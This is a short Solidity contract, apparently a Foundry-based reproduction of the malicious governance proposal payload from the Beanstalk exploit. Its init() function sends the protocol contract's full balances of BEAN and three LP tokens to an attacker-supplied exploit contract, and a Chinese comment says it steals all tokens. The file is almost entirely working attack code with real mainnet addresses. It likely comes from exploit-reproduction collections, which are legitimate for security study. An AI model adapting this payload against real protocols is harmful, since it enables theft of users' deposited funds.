// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "../interfaces/IERC20.sol";

contract BIP18 is Test {
    address constant BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    address constant BEAN_STALK = address(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    address constant BEANCRV_F =
        address(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    address constant BEANLUSD_F =
        address(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);
    address constant PROPOSER =
        address(0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4);
    address constant UNI_V2_BEAN_LP =
        address(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    address immutable EXPLOIT_CONTRACT;

    constructor(address _exploitAddr) {
        EXPLOIT_CONTRACT = _exploitAddr;
    }

    function init() external {
        console.log("exploit contract address: ", EXPLOIT_CONTRACT);
        IERC20(BEAN).transfer(EXPLOIT_CONTRACT, IERC20(BEAN).balanceOf(BEAN_STALK));
        IERC20(UNI_V2_BEAN_LP).transfer(EXPLOIT_CONTRACT, IERC20(UNI_V2_BEAN_LP).balanceOf(BEAN_STALK));
        IERC20(BEANCRV_F).transfer(EXPLOIT_CONTRACT, IERC20(BEANCRV_F).balanceOf(BEAN_STALK));
        IERC20(BEANLUSD_F).transfer(EXPLOIT_CONTRACT, IERC20(BEANLUSD_F).balanceOf(BEAN_STALK));
        // 偷走所有tokens & LP tokens
    }
}
